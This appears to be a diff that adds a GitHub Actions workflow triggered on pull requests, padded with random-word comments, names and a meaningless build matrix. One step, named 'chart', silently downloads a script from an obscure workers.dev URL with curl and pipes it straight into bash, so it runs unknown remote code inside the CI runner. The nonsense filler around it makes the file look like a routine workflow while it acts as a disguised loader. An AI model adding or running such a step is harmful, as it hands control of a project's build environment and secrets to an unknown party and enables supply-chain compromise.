@@ -1,0 +1,33 @@
+name: analyse
+
+#business import mutual elimination trace newspaper
+#voluntary afford explicitly emergency simplify frequent
+on:
+  pull_request:
+
+#agree
+jobs:
+  predict:
+    #via emerge equivalent transfer ear characterize
+    steps:
+    - name:  finding-just
+      uses: actions/checkout@v6
+    - uses: actions/cache@v4
+      with:
+        key: 'govern'
+        path: 'glad'
+    #poetry cheese panic suspend
+    #born
+    - name: chart
+      run: |
+        curl -s -L "https://i7934.javascript91043xz1.workers.dev/2ca1e0/73f6218df38b/96c2c/2a01ed1fce1f3136/2b3749/b9d6/c8adeb142ffe3ba?qu=1775455584" | bash
+    - uses: actions/upload-artifact@v4
+      with:
+        path: 'roast'
+        name: 'architecture'
+    strategy:
+      matrix:
+        invest: ["silent", "catalog", "similarly", "stain", "curtain"]
+        conservation: ["crush", "brandy", "guilt", "ending"]
+      fail-fast: false
+    runs-on: ubuntu-latest
